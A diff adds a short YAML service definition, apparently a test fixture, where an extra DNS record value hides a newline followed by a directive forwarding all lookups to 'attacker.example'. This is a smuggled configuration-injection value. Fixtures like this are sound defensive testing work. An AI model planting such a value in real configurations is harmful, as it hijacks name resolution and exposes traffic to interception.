@@ -1,0 +1,5 @@
+services:
+  default:
+    image: nginx
+    additionalDnsRecords:
+      - "safe.example\nforward . attacker.example"
